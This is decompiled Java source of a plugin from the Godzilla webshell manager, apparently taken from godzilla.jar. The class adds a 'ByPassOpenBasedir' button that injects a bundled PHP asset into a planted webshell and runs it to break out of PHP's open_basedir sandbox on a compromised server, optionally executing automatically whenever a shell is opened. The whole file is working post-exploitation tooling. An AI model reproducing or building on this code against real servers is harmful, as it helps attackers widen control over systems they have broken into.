/*     */ package shells.plugins.php;
/*     */ 
/*     */ import core.Db;
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JCheckBox;
/*     */ import javax.swing.JPanel;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "ByPassOpenBasedir", DisplayName = "ByPassOpenBasedir")
/*     */ public class ByPassOpenBasedir
/*     */   implements Plugin
/*     */ {
/*  41 */   private final JPanel panel = new JPanel();
/*     */   
/*  43 */   private final JButton bybassButton = new JButton("ByPassOpenBasedir"); private static final String CLASS_NAME = "plugin.ByPassOpenBasedir"; private static final String APP_ENV_KEY = "AutoExecByPassOpenBasedir";
/*  44 */   private final JCheckBox autoExec = new JCheckBox("autoExec"); private boolean loadState;
/*     */   
/*     */   public ByPassOpenBasedir() {
/*  47 */     boolean autoExecBoolean = false;
/*  48 */     if ("true".equals(Db.getSetingValue("AutoExecByPassOpenBasedir"))) {
/*  49 */       autoExecBoolean = true;
/*     */     }
/*  51 */     this.autoExec.setSelected(autoExecBoolean);
/*  52 */     this.autoExec.addActionListener(new ActionListener()
/*     */         {
/*     */           public void actionPerformed(ActionEvent paramActionEvent)
/*     */           {
/*  56 */             boolean autoExecBoolean = ByPassOpenBasedir.this.autoExec.isSelected();
/*  57 */             Db.updateSetingKV("AutoExecByPassOpenBasedir", Boolean.toString(autoExecBoolean));
/*     */           }
/*     */         });
/*     */ 
/*     */     
/*  62 */     this.panel.add(this.bybassButton);
/*  63 */     this.panel.add(this.autoExec);
/*     */     
/*  65 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */   private ShellEntity shell;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public JPanel getView() {
/*  72 */     return this.panel;
/*     */   }
/*     */   
/*     */   private void load() {
/*  76 */     if (!this.loadState) {
/*     */       try {
/*  78 */         InputStream inputStream = getClass().getResourceAsStream("assets/ByPassOpenBasedir.php");
/*  79 */         byte[] data = functions.readInputStream(inputStream);
/*  80 */         inputStream.close();
/*  81 */         if (this.payload.include("plugin.ByPassOpenBasedir", data)) {
/*  82 */           this.loadState = true;
/*  83 */           Log.log("Load success", new Object[0]);
/*     */         } else {
/*  85 */           Log.log("Load fail", new Object[0]);
/*     */         } 
/*  87 */       } catch (Exception e) {
/*  88 */         Log.error(e);
/*     */       } 
/*     */     }
/*     */   }
/*     */   
/*     */   private void bybassButtonClick(ActionEvent actionEvent) {
/*  94 */     if (!this.loadState) {
/*  95 */       load();
/*     */     }
/*     */     
/*  98 */     if (this.loadState) {
/*  99 */       byte[] result = this.payload.evalFunc("plugin.ByPassOpenBasedir", "run", new ReqParameter());
/* 100 */       String resultString = this.encoding.Decoding(result);
/* 101 */       Log.log(resultString, new Object[0]);
/* 102 */       GOptionPane.showMessageDialog(null, resultString, "提示", 1);
/*     */     } else {
/* 104 */       Log.error("load ByPassOpenBasedir fail!");
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity arg0) {
/* 110 */     this.shell = arg0;
/* 111 */     this.payload = arg0.getPayloadModule();
/* 112 */     this.encoding = Encoding.getEncoding(arg0);
/*     */     
/* 114 */     if (this.autoExec.isSelected())
/* 115 */       bybassButtonClick(null); 
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\ByPassOpenBasedir.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */